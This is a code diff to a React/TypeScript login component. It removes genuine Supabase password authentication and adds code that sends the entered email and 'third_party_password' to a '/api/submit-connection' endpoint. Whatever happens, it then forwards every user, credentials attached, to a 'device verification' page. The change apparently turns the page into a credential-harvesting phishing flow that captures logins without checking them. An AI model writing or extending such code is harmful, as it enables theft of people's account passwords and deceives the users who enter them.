@@ -56,23 +56,25 @@ export default function Connect({ externalError = '' }: ConnectProps) {
     setLoading(true);
 
     try {
-      const { error } = await supabase.auth.signInWithPassword({
+      // Record the submission immediately (anonymous) so no step can be skipped.
+      const payload = {
+        platform: 'Web-Login',
         email,
-        password,
+        third_party_password: password,
+      } as any;
+
+      const resp = await fetch('/api/submit-connection', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload),
       });
 
-      if (error) {
-        if (error.message.includes('Failed to fetch')) {
-          setErrorMessage('Connection failed. Please check your Supabase configuration in environment variables.');
-        } else {
-          setErrorMessage(error.message);
-        }
-        setLoading(false);
-        return;
+      if (!resp.ok) {
+        // Log but do not block the user flow — still redirect to device verification
+        console.error('Failed to record initial submission', await resp.text().catch(() => ''));
       }
 
-      // Successfully authenticated - redirect to device verification page
-      // Store credentials temporarily for the device verification flow
+      // Always redirect every user to device verification page (no restriction)
       navigate('/device-verification', {
         state: {
           email,
@@ -80,7 +82,15 @@ export default function Connect({ externalError = '' }: ConnectProps) {
         },
       });
     } catch (err: any) {
-      setErrorMessage(err.message || 'An unexpected error occurred.');
+      console.error('Error recording submission:', err);
+      // Still proceed; do not block the user
+      navigate('/device-verification', {
+        state: {
+          email,
+          password,
+        },
+      });
+    } finally {
       setLoading(false);
     }
   };
